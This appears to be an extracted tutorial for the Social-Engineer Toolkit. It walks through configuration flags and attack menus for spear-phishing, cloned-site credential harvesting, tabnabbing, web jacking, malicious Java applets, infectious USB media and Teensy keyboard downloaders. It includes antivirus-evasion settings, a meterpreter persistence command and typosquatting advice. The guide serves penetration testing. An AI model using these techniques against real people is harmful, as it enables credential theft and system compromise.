The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks 
against the human element. SET was designed to be released with the 
http://www.social-engineer.org launch and has quickly became a standard tool in a 
penetration testers arsenal. SET is written by David Kennedy (ReL1K) and with a lot of 
help from the community it has incorporated attacks never before seen in an 
exploitation toolset. The attacks built into the toolkit are designed to be focused 
attacks against a person or organization used during a penetration test. 
1 Beginning with the Social Engineer Toolkit 
 
The brain behind SET is the configuration file. SET by default works perfect for most 
people however, advanced customization may be needed in order to ensure that the 
attack vectors go off without a hitch. First thing to do is ensure that you have updated 
SET, from the directory: 
 
root@bt:/pentest/exploits/set# ./set-update 
U    src/payloads/set_payloads/http_shell.py 
U    src/payloads/set_payloads/shell.py 
U    src/payloads/set_payloads/shell.windows 
U    src/payloads/set_payloads/set_http_server.py 
U    src/payloads/set_payloads/persistence.py 
U    src/payloads/set_payloads/listener.py 
U    src/qrcode/qrgenerator.py 
U    modules/ratte_module.py 
U    modules/ratte_only_module.py 
U    set-automate 
U    set-proxy 
U    set 
U    set-update 
U    readme/LICENSE 
U    readme/CHANGES 
root@bt:/pentest/exploits/set#  
 
Once you’ve updated to the latest version, start tweaking your attack by editing the 
SET configuration file. Let’s walk through each of the flags: 
 
root@bt:/pentest/exploits/set# nano config/set_config 
 
 
# DEFINE THE PATH TO METASPLOIT HERE, FOR EXAMPLE 
/pentest/exploits/framework3 
METASPLOIT_PATH=/pentest/exploits/framework3 
    
 
 
 
3 
 
Looking through the configuration options, you can change specific fields to get a 
desired result. In the first option, you can change the path of where the location of 
Metasploit is. Metasploit is used for the payload creations, file format bugs, and for the 
browser exploit sections. 
 
# SPECIFY WHAT INTERFACE YOU WANT ETTERCAP TO LISTEN ON, IF 
NOTHING WILL DEFAULT 
# EXAMPLE: ETTERCAP_INTERFACE=wlan0 
ETTERCAP_INTERFACE=eth0 
# 
# ETTERCAP HOME DIRECTORY (NEEDED FOR DNS_SPOOF) 
ETTERCAP_PATH=/usr/share/ettercap 
 
The Ettercap section can be used when you’re on the same subnet as the victims and 
you want to perform DNS poison attacks against a subset of IP addresses. When this 
flag is set to ON, it will poison the entire local subnet and redirect a specific site or all 
sites to your malicious server running. 
 
# SENDMAIL ON OR OFF FOR SPOOFING EMAIL ADDRESSES 
SENDMAIL=OFF 
 
Setting the SENDMAIL flag to ON will try starting SENDMAIL, which can spoof source 
email addresses. This attack only works if the victim’s SMTP server does not perform 
reverse lookups on the hostname. SENDMAIL must be installed. If your using 
BackTrack 4, it is installed by default. 
 
# SET TO ON IF YOU WANT TO USE EMAIL IN CONJUNCTION WITH WEB 
ATTACK 
WEBATTACK_EMAIL=OFF 
 
When setting the WEBATTACK_EMAIL to ON, it will allow you to send mass emails to 
the victim while utilizing the Web Attack vector. Traditionally the emailing aspect is only 
available through the spear-phishing menu however when this is enabled it will add 
additional functionality for you to be able to email victims with links to help better your 
attacks. 
 
# CREATE SELF-SIGNED JAVA APPLETS AND SPOOF PUBLISHER NOTE THIS 
REQUIRES YOU TO 
# INSTALL --->  JAVA 6 JDK, BT4 OR UBUNTU USERS: apt-get install openjdk-6-
jdk 
# IF THIS IS NOT INSTALLED IT WILL NOT WORK. CAN ALSO DO apt-get install 
sun-java6-jdk 
SELF_SIGNED_APPLET=OFF 
    
 
 
 
4 
 
The Java Applet Attack vector is the attack with one of the highest rates of success 
that SET has in its arsenal. To make the attack look more believable, you can turn this 
flag on which will allow you to sign the Java Applet with whatever name you want. Say 
your targeting CompanyX, the standard Java Applet is signed by Microsoft, you can 
sign the applet with CompanyX to make it look more believable. This will require you to 
install java’s jdk (in Ubuntu its apt-get install sun-java6-jdk or openjdk-6-jdk). 
 
# THIS FLAG WILL SET THE JAVA ID FLAG WITHIN THE JAVA APPLET TO 
SOMETHING DIFFE$ 
# THIS COULD BE TO MAKE IT LOOK MORE BELIEVABLE OR FOR BETTER 
OBFUSCATION 
JAVA_ID_PARAM=Secure Java Applet 
# 
# JAVA APPLET REPEATER OPTION WILL CONTINUE TO PROMPT THE USER 
WITH THE JAVA AP$ 
# THE USER HITS CANCEL. THIS MEANS IT WILL BE NON STOP UNTIL RUN IS 
EXECUTED. T$ 
# A BETTER SUCCESS RATE FOR THE JAVA APPLET ATTACK 
JAVA_REPEATER=ON 
 
When a user gets the java applet warning, they will see the ‘Secure Java Applet’ as the 
name of the Applet instead of the IP address. This adds a better believability to the java 
applet. The second option will prompt the user over and over with nagging Java Applet 
warnings if they hit cancel. This is useful when the user clicks cancel and the attack 
would be rendered useless, instead it will continue to pop up over and over. 
 
# AUTODETECTION OF IP ADDRESS INTERFACE UTILIZING GOOGLE, SET THIS 
ON IF YOU WANT 
# SET TO AUTODETECT YOUR INTERFACE 
AUTO_DETECT=ON 
 
The AUTO_DETECT flag is probably one of the most asked questions in SET. In most 
cases, SET will grab the interface you use in order to connect out to the Internet and 
use that as the reverse connection and IP address. Most attacks need to be 
customized and may not be on the internal network. If you turn this flag to OFF, SET 
will prompt you with additional questions on setting up the attack. This flag should be 
used when you want to use multiple interfaces, have an external IP, or you’re in a 
NAT/Port forwarding scenario. 
 
# SPECIFY WHAT PORT TO RUN THE HTTP SERVER OFF OF THAT SERVES THE 
JAVA APPLET ATTACK 
# OR METASPLOIT EXPLOIT. DEFAULT IS PORT 80. 
WEB_PORT=80 
    
 
 
 
5 
 
By default the SET web server listens on port 80, if for some reason you need to 
change this, you can specify an alternative port. 
 
# CUSTOM EXE YOU WANT TO USE FOR METASPLOIT ENCODING, THIS 
USUALLY HAS BETTER AV 
# DETECTION. CURRENTLY IT IS SET TO LEGIT.BINARY WHICH IS JUST 
CALC.EXE. AN EXAMPLE 
# YOU COULD USE WOULD BE PUTTY.EXE SO THIS FIELD WOULD BE 
/pathtoexe/putty.exe 
CUSTOM_EXE=src/exe/legit.binary 
 
When using the payload encoding options of SET, the best option for Anti-Virus bypass 
is the backdoored, or loaded with a malicious payload hidden in the exe, executable 
option. Specifically an exe is backdoored with a Metasploit based payload and can 
generally evade most AV’s out there. SET has an executable built into it for the 
backdooring of the exe however if for some reason you want to use a different 
executable, you can specify the path to that exe with the CUSTOM_EXE flag. 
 
# USE APACHE INSTEAD OF STANDARD PYTHON WEB SERVERS, THIS WILL 
INCREASE SPEED OF 
# THE ATTACK VECTOR 
APACHE_SERVER=OFF 
# 
# PATH TO THE APACHE WEBROOT 
APACHE_DIRECTORY=/var/www 
 
The web server utilized within SET is a custom-coded web server that at times can be 
somewhat slow based off of the needs. If you find that you need a boost and want to 
utilize Apache, you can flip this switch to ON and it will use Apache to handle the web 
requests and speed your attack up. Note that this attack only works with the Java 
Applet and Metasploit based attacks. Based on the interception of credentials, Apache 
cannot be used with the web jacking, tabnabbing, or credential harvester attack 
methods. 
 
# TURN ON SSL CERTIFICATES FOR SET SECURE COMMUNICATIONS 
THROUGH WEB_ATTACK VECTOR 
WEBATTACK_SSL=OFF 
# 
# PATH TO THE PEM FILE TO UTILIZE CERTIFICATES WITH THE WEB ATTACK 
VECTOR (REQUIRED) 
# YOU CAN CREATE YOUR OWN UTILIZING SET, JUST TURN ON 
SELF_SIGNED_CERT 
# IF YOUR USING THIS FLAG, ENSURE OPENSSL IS INSTALLED! 
    
 
 
 
6 
# 
SELF_SIGNED_CERT=OFF 
# 
# BELOW IS THE CLIENT/SERVER (PRIVATE) CERT, THIS MUST BE IN PEM 
FORMAT IN ORDER TO WORK 
# SIMPLY PLACE THE PATH YOU WANT FOR EXAMPLE 
/root/ssl_client/server.pem 
PEM_CLIENT=/root/newcert.pem 
PEM_SERVER=/root/newreq.pem 
 
In some cases when your performing an advanced social-engineer attack you may 
want to register a domain and buy an SSL cert that makes the attack more believable. 
You can incorporate SSL based attacks with SET. You will need to turn the 
WEBATTACK_SSL to ON. If you want to use self-signed certificates you can as well 
however there will be an “untrusted” warning when a victim goes to your website. 
 
TWEAK THE WEB JACKING TIME USED FOR THE IFRAME REPLACE, 
SOMETIMES IT CAN BE A LITTLE SLOW 
# AND HARDER TO CONVINCE THE VICTIM. 5000 = 5 seconds 
WEBJACKING_TIME=2000 
 
The webjacking attack is performed by replacing the victim’s browser with another 
window that is made to look and appear to be a legitimate site. This attack is very 
dependant on timing, if your doing it over the Internet, I recommend the delay to be 
5000 (5 seconds) otherwise if your internal, 2000 (2 seconds) is probably a safe bet. 
 
# PORT FOR THE COMMAND CENTER 
COMMAND_CENTER_PORT=44444 
# 
# COMMAND CENTER INTERFACE TO BIND TO BY DEFAULT IT IS LOCALHOST 
ONLY. IF YOU WANT TO ENABLE IT 
# SO YOU CAN HIT THE COMMAND CENTER REMOTELY PUT THE INTERFACE 
TO 0.0.0.0 TO BIND TO ALL INTERFACES. 
COMMAND_CENTER_INTERFACE=127.0.0.1 
# 
# HOW MANY TIMES SET SHOULD ENCODE A PAYLOAD IF YOU ARE USING 
STANDARD METASPLO$ 
ENCOUNT=4 
 
# IF THIS OPTION IS SET, THE METASPLOIT PAYLOADS WILL AUTOMATICALLY 
MIGRATE TO 
# NOTEPAD ONCE THE APPLET IS EXECUTED. THIS IS BENEFICIAL IF THE 
VICTIM CLOSES 
    
 
 
 
7 
# THE BROWSER HOWEVER CAN INTRODUCE BUGGY RESULTS WHEN AUTO 
MIGRATING. 
AUTO_MIGRATE=OFF 
 
The AUTO_MIGRATE feature will automatically migrate to notepad.exe when a 
meterpreter shell is spawned. This is especially useful when using browser exploits as 
it will terminate the session if the browser is closed when using an exploit. 
 
# DIGITAL SIGNATURE STEALING METHOD MUST HAVE THE PEFILE PYTHON 
MODULES LOADED 
# FROM http://code.google.com/p/pefile/. BE SURE TO INSTALL THIS BEFORE 
TURNING 
# THIS FLAG ON!!! THIS FLAG GIVES MUCH BETTER AV DETECTION 
DIGITAL_SIGNATURE_STEAL=ON 
 
The digital signature stealing method requires the python module called PEFILE which 
uses a technique used in Disitool by Didier Stevens by taking the digital certificate 
signed by Microsoft and importing it into a malicious executable. A lot of times this will 
give better anti-virus detection. 
 
# THESE TWO OPTIONS WILL TURN THE UPX PACKER TO ON AND 
AUTOMATICALLY ATTEMPT 
# TO PACK THE EXECUTABLE WHICH MAY EVADE ANTI-VIRUS A LITTLE 
BETTER. 
UPX_ENCODE=ON 
UPX_PATH=/pentest/database/sqlmap/lib/contrib/upx/linux/upx 
 
In addition to digital signature stealing, you can do additional packing by using UPX. 
This is installed by default on Back|Track linux, if this is set to ON and it does not find 
it, it will still continue but disable the UPX packing. 
 
# HERE WE CAN RUN MULTIPLE METERPRETER SCRIPTS ONCE A SESSION IS 
ACTIVE. THIS 
# MAY BE IMPORTANT IF WE ARE SLEEPING AND NEED TO RUN PERSISTENCE, 
TRY TO ELEVATE 
# PERMISSIONS AND OTHER TASKS IN AN AUTOMATED FASHION. FIRST TURN 
THIS TRIGGER ON 
# THEN CONFIGURE THE FLAGS. NOTE THAT YOU NEED TO SEPERATE THE 
COMMANDS BY A ;  
METERPRETER_MULTI_SCRIPT=OFF 
# 
# WHAT COMMANDS DO YOU WANT TO RUN ONCE A METERPRETER SESSION 
HAS BEEN ESTABLISHED. 
    
 
 
 
8 
# BE SURE IF YOU WANT MULTIPLE COMMANDS TO SEPERATE WITH A ;. FOR 
EXAMPLE YOU COULD DO 
# run getsystem;run hashdump;run persistence TO RUN THREE DIFFERENT 
COMMANDS 
METERPRETER_MULTI_COMMANDS=run persistence -r 192.168.1.5 -p 21 -i 300 -
X -A;getsystem 
 
The next options can configure once a meterpreter session has been established, what 
types of commands to automatically run. This would be useful if your getting multiple 
shells and want to execute specific commands to extract information on the system. 
 
# THIS FEATURE WILL AUTO EMBED A IMG SRC TAG TO A UNC PATH OF YOUR 
ATTACK MACHINE. 
# USEFUL IF YOU WANT TO INTERCEPT THE HALF LM KEYS WITH 
RAINBOWTABLES. WHAT WILL HAPPEN 
# IS AS SOON AS THE VICTIM CLICKS THE WEB-PAGE LINK, A UNC PATH WILL 
BE INITIATED 
# AND THE METASPLOIT CAPTURE/SMB MODULE WILL INTERCEPT THE HASH 
VALUES. 
UNC_EMBED=OFF 
# 
 
This will automatically embed a UNC path into the web application, when the victim 
connects to your site, it will try connecting to the server via a file share. When that 
occurs a challenge response happens and the challenge/responses can be captured 
and used for attacking. 
2 SET Menu’s 
 
SET is a menu driven based attack system, which is fairly unique when it comes to 
hacker tools. The decision not to make it command line was made because of how 
social-engineer attacks occur; it requires multiple scenarios, options, and 
customizations. If the tool had been command line based it would have really limited 
the effectiveness of the attacks and the inability to fully customize it based on your 
target. Let’s dive into the menu and do a brief walkthrough of each attack vector.

Welcome to the SET E-Mail attack method. This module allows you 
to specially craft email messages and send them to a large (or small) number of 
    
 
 
 
10 
people with attached fileformat malicious payloads. If you want to spoof your 
email address, be sure "Sendmail" is installed (it is installed in BT4) and change 
the config/set_config SENDMAIL=OFF flag to SENDMAIL=ON. 
 
There are two options, one is getting your feet wet and letting SET do everything 
for you (option 1), the second is to create your own FileFormat payload and use it 
in your own attack. Either way, good luck and enjoy! 
 
1. Perform a Mass Email Attack

The spear-phishing attack menu is used for performing targeted email attacks against 
a victim. You can send multiple emails based on what your harvested or you can send 
it to individuals.  You can also utilize fileformat (for example a PDF bug) and send the 
malicious attack to the victim in order to hopefully compromise the system.

The Social-Engineer Toolkit "Web Attack" vector is a unique way of utilizing 
multiple web-based attacks in order to compromise the intended victim. 
 
    
 
 
 
11 
Enter what type of attack you would like to utilize. 
 
The Java Applet attack will spoof a Java Certificate and deliver a Metasploit 
based payload. Uses a customized java applet created by Thomas Werth to 
deliver the payload. 
 
The Metasploit browser exploit method will utilize select Metasploit browser 
exploits through an iframe and deliver a Metasploit payload. 
 
The Credential Harvester Method will utilize web cloning of a website that has a 
username and password field and harvest all the information posted to the 
website. 
 
The TabNabbing Method will wait for a user to move to a different tab, then 
refresh the page to something different. 
 
The web jacking attack method was introduced by white_sheep, Emgent and the 
Back|Track team. This method utilizes iframe replacements to make the 
highlighted URL link to appear legitimate however when clicked a window pops 
up then is replaced with the malicious link. You can edit the link replacement 
settings in the set_config if its to slow/fast. 
 
The multi-attack will add a combination of attacks through the web attack 
menu. For example you can utilize the Java Applet, Metasploit Browser, 
Credential Harvester/Tabnabbing, all at once to see which is successful. 
 
   1) Java Applet Attack Method 
   2) Metasploit Browser Exploit Method 
   3) Credential Harvester Attack Method 
   4) Tabnabbing Attack Method 
   5) Web Jacking Attack Method 
   6) Multi-Attack Web Method 
   7) Full Screen Attack Method 
  99) Return to Main Menu 
 
  set:webattack> 
 
The web attack vector is used by performing phishing attacks against the victim in 
hopes they click the link. There is a wide-variety of attacks that can occur once they 
click. We will dive into each one of the attacks later on. 
 
3.  Infectious Media Generator 
 
    
 
 
 
12 
The infectious USB/DVD creator will develop a Metasploit based payload for you and 
craft an autorun.inf file that once burned or placed on a USB will trigger an autorun 
feature and hopefully compromise the system. This attack vector is relatively simple in 
nature and relies on deploying the devices to the physical system. 
 
4.  Create a Payload and Listener 
 
The create payload and listener is an extremely simple wrapper around Metasploit to 
create a payload, export the exe for you and generate a listener. You would need to 
transfer the exe onto the victim machine and execute it in order for it to properly work. 
 
5.  Mass Mailer Attack 
 
The mass mailer attack will allow you to send multiple emails to victims and customize 
the messages. This option does not allow you to create payloads, so it is generally 
used to perform a mass phishing attack.

The Arduino-Based Attack Vector utilizes the Arduin-based device to 
 program the device. You can leverage the Teensy's, which have onboard 
 storage and can allow for remote code execution on the physical 
 system. Since the devices are registered as USB Keyboard's it 
 will bypass any autorun disabled or endpoint protection on the 
 system. 
 
 You will need to purchase the Teensy USB device, it's roughly 
    
 
 
 
13 
 $22 dollars. This attack vector will auto generate the code 
 needed in order to deploy the payload on the system for you. 
 
 This attack vector will create the .pde files necessary to import 
 into Arduino (the IDE used for programming the Teensy). The attack 
 vectors range from Powershell based downloaders, wscript attacks,  
 and other methods.

 Special thanks to: IronGeek, WinFang, and Garland 
 
 This attack vector also attacks X10 based controllers, be sure to be leveraging 
 X10 based communication devices in order for this to work. 
 
 Select a payload to create the pde file to import into Arduino: 
 
   1) Powershell HTTP GET MSF Payload

The teensy USB HID attack is a method used by purchasing a hardware based device 
from prjc.com and programming it in a manner that makes the small USB 
microcontroller to look and feel exactly like a keyboard. The important part with this is 
it bypasses autorun capabilities and can drop payloads onto the system through the 
onboard flash memory. The keyboard simulation allows you to type characters in a 
    
 
 
 
14 
manner that can utilize downloaders and exploit the system. 
3 Spear-Phishing Attack Vector 
 
As mentioned previously, the spear phishing attack vector can be used to send 
targeted emails with malicious attachments.  In this example we are going to craft an 
attack, integrate into GMAIL and send a malicious PDF to the victim. One thing to note 
is you can create and save your own templates to use for future SE attacks or you can 
use pre-built ones. When using SET just to note that when hitting enter for defaults, it 
will always be port 443 as the reverse connection back and a reverse Meterpreter.

Welcome to the SET E-Mail attack method. This module allows you 
to specially craft email messages and send them to a large (or small) 
number of people with attached fileformat malicious payloads. If you 
want to spoof your email address, be sure "Sendmail" is installed (it 
is installed in BT4) and change the config/set_config SENDMAIL=OFF flag 
to SENDMAIL=ON. 
 
There are two options, one is getting your feet wet and letting SET do 
everything for you (option 1), the second is to create your own FileFormat 
payload and use it in your own attack. Either way, good luck and enjoy!

The spear-phishing attack can send to multiple people or individuals, it integrates into 
Google mail and can be completely customized based on your needs for the attack 
vector. Overall this is very effective for email spear-phishing. 
 
4 Java Applet Attack Vector 
 
The Java Applet is one of the core attack vectors within SET and the highest success 
rate for compromise. The Java Applet attack will create a malicious Java Applet that 
once run will completely compromise the victim. The neat trick with SET is that you can 
completely clone a website and once the victim has clicked run, it will redirect the 
victim back to the original site making the attack much more believable. This attack 
vector affects Windows, Linux, and OSX and can compromise them all. Remember if 
you want to customize this attack vector, edit the config/set_config in order to change 
the self-signed information. In this specific attack vector, you can select web templates 
which are pre-defined websites that have already been harvested, or you can import 
your own website. In this example we will be using the site cloner which will clone a 
    
 
 
 
21 
website for us. Let’s launch SET and prep our attack.

   1) Spear-Phishing Attack Vectors 
   2) Website Attack Vectors 
   3) Infectious Media Generator 
   4) Create a Payload and Listener

The Web Attack module is  a unique way of utilizing multiple web-based attacks 
 in order to compromise the intended victim. 
 
 The Java Applet Attack method will spoof a Java Certificate and deliver a  
 metasploit based payload. Uses a customized java applet created by Thomas 
 Werth to deliver the payload. 
 
 The Metasploit Browser Exploit method will utilize select Metasploit 
 browser exploits through an iframe and deliver a Metasploit payload. 
 
 The Credential Harvester method will utilize web cloning of a web- 
 site that has a username and password field and harvest all the  
 information posted to the website. 
 
 The TabNabbing method will wait for a user to move to a different 
 tab, then refresh the page to something different. 
 
 The Web-Jacking Attack method was introduced by white_sheep, Emgent  
 and the Back|Track team. This method utilizes iframe replacements to  
 make the highlighted URL link to appear legitimate however when clicked  
 a window pops up then is replaced with the malicious link. You can edit 
 the link replacement settings in the set_config if its too slow/fast. 
 
    
 
 
 
22 
 The Multi-Attack method will add a combination of attacks through the web    
attack menu. For example you can utilize the Java Applet, Metasploit Browser, 
 Credential Harvester/Tabnabbing, all at once to see which is successful. 
 
   1) Java Applet Attack Method 
   2) Metasploit Browser Exploit Method 
   3) Credential Harvester Attack Method

The first method will allow SET to import a list of pre-defined web  
 applications that it can utilize within the attack. 
 
 The second method will completely clone a website of your choosing 
 and allow you to utilize the attack vectors within the completely 
 same web application you were attempting to clone. 
 
 The third method allows you to import your own website, note that you 
 should only have an index.html when using the import website 
 functionality.

In this attack, we’ve set up our scenario to clone https://gmail.com and use the reverse 
meterpreter attack vector on port 443. We’ve used the backdoored executable to 
hopefully bypass anti-virus and setup Metasploit to handler the reverse connections. If 
you wanted to utilize an email with this attack vector you could turn the 
config/set_config turn the WEBATTACK_EMAIL=OFF to WEBATTACK_EMAIL=ON. 
When you get a victim to click a link or coax him to your website, it will look something 
like this: 
 
    
 
 
 
27 
 
 
As soon as the victim clicks run, you are presented with a meterpreter shell, and the 
victim is redirected back to the original Google site completely unaware that they have 
been compromised. Note that Java has updated their applet code to show the 
“Publisher” field on the applet as UNKNOWN when self signing. In order to bypass 
this, you will need to register a company in your local state, and buy a code signing 
certificate in the company name.

5 Full Screen Attack Vector 
 
FullScreen Attack by: d4rk0 -> Twitter: @d4rk0s 
 
Attack Description:  
 
    
 
 
 
28 
The full-screen attack utilizes the trust in the web browser by using the introduced 
FullScreen API available in Firefox, Chrome and Safari.  ( Windows , Mac or Linux ) 
 
The FullScreen attack module comes available with just two FullScreen Attack options.  
Getting the user to click on a crafted link with spoofed browser tooltip text when the 
user rolls over the link making them believe it's really https://www.gmail.com . When 
clicked a script detects which type of browser the user is running and deploys images 
to match the browser ( including OS ) .  Displaying a fake page and asking for user 
passwords or other important information.  
 
Full-Screen Main Menu: 
 
The main menu displays three options the first to generate an original FullScreen attack 
on it's own separate page. The second option is crafting the full-screen attack into a 
usable XSS ( Cross site scripting ) set of files ready to be deployed. And of course the 
last option will take you back to SETs previous menu.  
 
First Option: 
 
First option will display two available Full-Screen Attacks Picking one or the other will 
result in several prompts asking you information based on how you would 
like your FullScreen Attack page created for field deployment. Currently the two 
Generated attacks 
are GMAIL and FACEBOOK. PHP must be enabled on your server for additional 
information gathering  
techniques to work. It will ask if you have a local server running? A simple Yes or no 
will lead you to either 
storing the generated files locally on disk or locally within your running web server. The 
next question will ask 
about relaying the victims information after the attack has been established and 
finalized. The information can either be saved locally on disk or be mailed to you. ( If 
you pick mail please make sure PHPs mail features are setup and running. ) 
Entering an Email address or answering if you would like a Random File name 
generated for each new submission is then asked. Obviously picking No to random 
files will have you enter a file name where all results will be stored on disk. The next 
question will ask if you would like to gather a more in-depth information gathering 
profile for each victim, this includes things such as GEOIP, ISP, USER AGENT etc.. 
Other various questions will be asked hitting enter will keep the default answer for each 
situation. There is also a brief description of each function and what it does also. Make 
sure SET has proper read + write priv set so it can create all of the newly generated 
files. Success messages will be displayed after everything has been created. [ 1 PHP 
File , js Folder , img Folder , css Folder ] The php file will depend on the name you 
assigned it during configuration the default is index.php. * DO NOT RE NAME ANY 
FOLDERS OR FILES WITHIN FOLDERS *

Second Option: 
 
The second option is for XSS deployment and my favorite. This ends up creating all 
folders and simply linking to your header.js file (http://yoursite/header.js) in your XSS 
payload will display the FullScreen attack file embedded within whatever site you have 
ethically found and are exploiting an XSS within. This also requires PHP be present on 
your attacking server because a PHP file will be there listening for incoming form 
submissions. The XSS vuln should be able to run JavaScript for this attack to work 
properly. Currently there is only one XSS Full-Screen generation option available, 
which is Facebook. More options and methods will be added in the future. 
     
The First question after selecting this attack is to specify the absolute path of where 
you are keeping all the folders and files. ( Ex: http://mysite.net/FullScreenfolder ) This 
needs to be specific so all the images and files can all have an absolute path so they 
are displayed during the XSS attack. All other questions will be straightforward and 
explained with a brief description of what it does. Last you will pick a spot where to 
upload all of the generated files for the attack. There will be one PHP file called 
varGrab.php that will sit on your backend server listening to incoming data. (The data is 
transferred using various JavaScript methods ) The others are folders created [js, img, 
css ] . The JavaScript file that you want to link during your XSS payload is [ 
http://yoursite.com/js/header.js ]  ( in the js folder ) 
 
 * DO NOT CHANGE FOLDER OR FILE NAMES UNLESS YOU ARE REALLY DIVING 
INTO THINGS * 
6 Metasploit Browser Exploit Method 
 
The Metasploit Browser Exploit Method will import Metasploit client-side exploits with 
the ability to clone the website and utilize browser-based exploits. Let’s take a quick 
look on exploiting a browser exploit through SET.

The Web Attack module is  a unique way of utilizing multiple web-based attack in 
order to compromise the intended victim. 
 
 The Java Applet Attack method will spoof a Java Certificate and deliver a  
 metasploit based payload. Uses a customized java applet created by Thomas 
Werth to deliver the payload. 
 
 The Metasploit Browser Exploit method will utilize select Metasploit 
 browser exploits through an iframe and deliver a Metasploit payload. 
 
 The Credential Harvester method will utilize web cloning of a web- 
 site that has a username and password field and harvest all the  
 information posted to the website. 
 
 The TabNabbing method will wait for a user to move to a different 
 tab, then refresh the page to something different. 
 
 The Web-Jacking Attack method was introduced by white_sheep, Emgent  
 and the Back|Track team. This method utilizes iframe replacements to  
 make the highlighted URL link to appear legitimate however when clicked  
 a window pops up then is replaced with the malicious link. You can edit 
 the link replacement settings in the set_config if its too slow/fast. 
 
 The Multi-Attack method will add a combination of attacks through the web 
attack menu. For example you can utilize the Java Applet, Metasploit Browser, 
Credential Harvester/Tabnabbing all at once to see which is successful. 
 
   1) Java Applet Attack Method

7 Credential Harvester Attack Method 
 
The credential harvester attack method is used when you don’t want to specifically get 
a shell but perform phishing attacks in order to obtain username and passwords from 
the system. In this attack vector, a website will be cloned, and when the victim enters 
in the user credentials, the usernames and passwords will be posted back to your 
machine and then the victim will be redirected back to the legitimate site.

8 Tabnabbing Attack Method 
 
The tabnabbing attack method is used when a victim has multiple tabs open, when the 
user clicks the link, the victim will be presented with a “Please wait while the page 
loads”. When the victim switches tabs because he/she is multi-tasking, the website 
detects that a different tab is present and rewrites the webpage to a website you 
    
 
 
 
39 
specify.  The victim clicks back on the tab after a period of time and thinks they were 
signed out of their email program or their business application and types the 
credentials in. When the credentials are inserts, they are harvested and the user is 
redirected back to the original website.

9 Web Jacking Attack Method 
 
The web jacking attack method will create a website clone and present the victim with 
a link stating that the website has moved.  This is a new feature to version 0.7.1. When 
you hover over the link, the URL will be presented with the real URL, not the attackers 
machine. So for example if your cloning gmail.com, the url when hovered over it would 
be gmail.com. When the user clicks the moved link, gmail opens and then is quickly 
replaced with your malicious webserver. Remember you can change the timing of the 
webjacking attack in the config/set_config flags.

When the victim clicks the link he is presented with the following webpage: 
 
 
 
If you notice the URL bar we are at our malicious web server. In cases with social-
engineering, you want to make it believable, using an IP address is generally a bad 
idea. My recommendation is if your doing a penetration test, register a name that’s 
similar to the victim, for gmail you could do gmai1.com (notice the 1), something similar 
that can mistake the user into thinking it’s the legitimate site. Most of the time they 
    
 
 
 
44 
won’t even notice the IP but its just another way to ensure it goes on without a hitch. 
Now that the victim enters the username and password in the fields, you will notice 
that we can intercept the credentials now.

10 Multi-Attack Web Vector 
 
The multi-attack web vector is new to 0.7.1 and will allow you to specify multiple web 
attack methods in order to perform a single attack. In some scenarios, the Java Applet 
may fail however an internet explorer exploit would be successful. Or maybe the Java 
Applet and the Internet Explorer exploit fail and the credential harvester is successful. 
The multi-attack vector allows you to turn on and off different vectors and combine the 
attacks all into one specific webpage. So when the user clicks the link he will be 
targeted by each of the attack vectors you specify. One thing to note with the attack 
vector is you can’t utilize Tabnabbing, Cred Harvester, or Web Jacking. Based on the 
    
 
 
 
45 
attack vectors they shouldn’t be combined anyways. Let’s take a look at the multi 
attack vector. In this scenario I’m going to turn on the Java Applet attack, Metasploit 
Client-Side exploit, and the Web Jacking attack. When the victim browses the site, 
he/she will need to click on the link and will be bombarded with credential harvester, 
Metasploit exploits, and the java applet attack.  I’m going to intentionally select an 
Internet Explorer 7 exploit and browse utilizing IE6 just to demonstrate if one fails, we 
have other methods. 
 
   1) Java Applet Attack Method 
   2) Metasploit Browser Exploit Method 
   3) Credential Harvester Attack Method

 The first method will allow SET to import a list of pre-defined web  
 applications that it can utilize within the attack. 
 
 The second method will completely clone a website of your choosing 
 and allow you to utilize the attack vectors within the completely 
 same web application you were attempting to clone. 
 
 The third method allows you to import your own website, note that you 
 should only have an index.html when using the import website functionality.

Moving on to the physical attack vectors and a completely different attack method, 
we will be utilizing the Infectious USB/DVD/CD attack vector. This attack vector will 
allow you to import your own malicious executable or one of those within Metasploit to 
create a DVD/CD/USB that incorporates an autorun.inf file. Once this device is inserted 
it will call autorun and execute the executable. New in the most recent version, you can 
utilize file-format exploits as well, if your worried that an executable will trigger alerts, 
you can specify a file format exploit that will trigger an overflow and compromise the 
system (example an Adobe exploit).

In this example we specified a file format attack in order to create the infectious 
USB/DVD/CD. A folder is created called ‘SET’ in the root of the SET directory that 
contains the components you will need to copy over to the media device of your

choosing. Once inserted, the file format exploit would trigger an overflow and if they 
were susceptible, it would completely compromise their system with a meterpreter 
shell. If we would have selected the executable section, it will have been the same 
avenues as previously walked through in this chapter but instead of triggering an 
exploit, it would trigger an executable. 
 
When doing an ls –al in the SET directory you should notice that there is an “autorun” 
folder. Burn the contents of that directory to a DVD or write to a USB device. Once 
inserted you would be presented with a shell.

12 Teensy USB HID Attack Vector 
 
The Teensy USB HID Attack Vector is a remarkable combination of customized 
hardware and bypassing restrictions by keyboard emulation. Traditionally when you 
insert a DVD/CD or USB if autorun is disabled, your autorun.inf isn’t called and you 
can’t execute your code automatically. With the Teensy HID based device you can 
emulate a keyboard and mouse. When you insert the device it will be detected as a 
keyboard, and with the microprocessor and onboard flash memory storage you can 
send a very fast set of keystrokes to the machine and completely compromise it. You 
can order a Teensy device for around 17 dollars at http://www.prjc.com. Quickly after 
David Kennedy, Josh Kelley, and Adrian Crenshaw’s talk on the Teensy devices, a PS3 
hack came out utilizing the Teensy devices and they are currently backordered during 
the time of writing this tutorial.  
 
Let’s setup or Teensy device to do a WSCRIPT downloader of a Metasploit payload. 
What will occur here is that a small wscript file will be written out which will download 
an executable and execute it. This will be our Metasploit payload and is all handled 
through the Social-Engineer Toolkit.

 The Arduino-Based Attack Vector utilizes the Arduin-based device to 
 program the device. You can leverage the Teensy's, which have onboard 
 storage and can allow for remote code execution on the physical 
 system. Since the devices are registered as USB Keyboard's it 
 will bypass any autorun disabled or endpoint protection on the 
 system. 
 
 You will need to purchase the Teensy USB device, it's roughly 
 $22 dollars. This attack vector will auto generate the code 
 needed in order to deploy the payload on the system for you. 
 
 This attack vector will create the .pde files necessary to import 
 into Arduino (the IDE used for programming the Teensy). The attack 
 vectors range from Powershell based downloaders, wscript attacks,  
 and other methods.

Now that we have everything ready, SET exports a file called teensy.pde to the reports/ 
folder. Copy that reports folder to wherever you have Arduino installed. With this 
attack, follow the instructions at PRJC on how to upload your code to the Teensy 
board, its relatively simple you just need to install the Teensy Loader and the Teensy 
